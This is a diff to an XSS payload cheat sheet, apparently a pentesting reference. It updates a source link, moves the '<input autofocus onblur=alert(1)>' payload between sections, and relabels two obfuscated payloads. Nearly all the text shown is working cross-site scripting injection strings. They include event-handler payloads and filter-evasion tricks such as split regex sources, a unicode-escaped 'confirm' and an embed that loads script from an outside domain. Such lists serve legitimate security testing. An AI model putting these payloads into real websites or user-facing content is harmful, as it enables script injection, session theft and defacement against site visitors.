@@ -4,7 +4,7 @@ Just a bunch of XSS payloads.
 
 ### Refs
 - https://github.com/s0md3v/AwesomeXSS
-- https://xz.aliyun.com/t/1126
+- https://web.archive.org/web/20201130213801/https://xz.aliyun.com/t/1126
 
 
 ## SCRIPT
@@ -50,14 +50,15 @@ onload=alert(1)>
 <form onsubmit=alert(1)><input type=submit>
 <a href="" onmousedown="var name='&#39;;alert(1)//'; alert('smthg')">Link</a>
 <input type="text" autofocus onfocus="console.log(1)>
+<input autofocus onblur=alert(1)>
 <input autofocus onblur = "[1].find(alert)"> -->
 <input autofocus onblur = "[1].find(top[/al/.source+/ert/.source])(1)">
 <body onhashchange=alert(1)><a href=#x>click this!#x
 <x onclick=alert(1)>click this!
 <plaintext/onmouseover=prompt(1)>
 <embed src=//14.rs>
-<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
-<d3/onmouseenter=[2].find(confirm)>z
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>DOUBLECLICK
+<d3/onmouseenter=[2].find(confirm)>HOVER
 ```
 
 ## HTML 5 
@@ -69,7 +70,6 @@ onload=alert(1)>
 <marquee loop=1 width=0 onfinish=alert(1)>
 <audio src onloadstart=alert(1)>
 <meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
-<input autofocus onblur=alert(1)>
 <keygen autofocus onfocus=alert(1)>
 ```
 
